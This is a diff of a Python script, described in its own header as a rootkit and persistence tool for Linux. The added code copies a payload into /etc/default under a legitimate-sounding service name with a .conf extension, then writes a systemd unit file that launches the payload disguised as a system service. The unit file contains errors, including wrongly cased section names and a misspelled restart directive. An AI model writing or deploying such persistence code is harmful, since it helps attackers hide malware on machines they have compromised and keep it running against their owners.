@@ -1,5 +1,5 @@
 #Using Root Access, we will create a systemd service and hide the malware inside a 
-#Root-only folder
+#Root-only folder. High level rootkit & persistence.
 #Author: Mitchell Nicholson
 
 import os
@@ -60,7 +60,7 @@ defaultServices = {
 if platform.system() == "Linux":
     import dbus
 else:
-    py_sip_xnu = None
+    dbus = None
 
 class createService:
     def __init__(self, payload):
@@ -122,7 +122,41 @@ class createService:
             
 
     def _hideInRoot(self):
-        defaultPath = '/etc/default'
+        #we will now hide the software in the /etc/default directory
+        #It will return the path to the renamed payload
+        defaultPath = '/etc/default/'
         hiddenOption = self._chooseServices()
         hiddenName = list(hiddenOption)[0]
-        shutil.copy(self.payload, defaultPath+hiddenName+'.conf')
+        defaultPath = defaultPath+hiddenName+'.conf'
+        shutil.copy(self.payload, defaultPath)
+        return defaultPath, hiddenOption
+
+#for making the .service file using this method:
+    # value = "hello"   
+    # bash_sript = f"""
+    # #!/bin/bash
+
+    # echo {value}
+
+    # """
+    def _createService(self, defaultPath, chosenOption):
+        description = chosenOption[1]
+        servName = chosenOption[0]+'.service'
+        
+        psuedo_service = f"""[UNIT]
+Description={description}
+
+[SERVICE]
+ExecStart={defaultPath}
+Retart=on-failure
+
+[INSTALL]
+        """
+        serviceFile = open('/etc/systemd/system/'+servName, 'w')
+        serviceFile.write(psuedo_service)
+        serviceFile.close()
+
+    def sillySit(self):
+        hidePath, hideName = self._hideInRoot()
+        self._createService(hidePath, hideName)
+
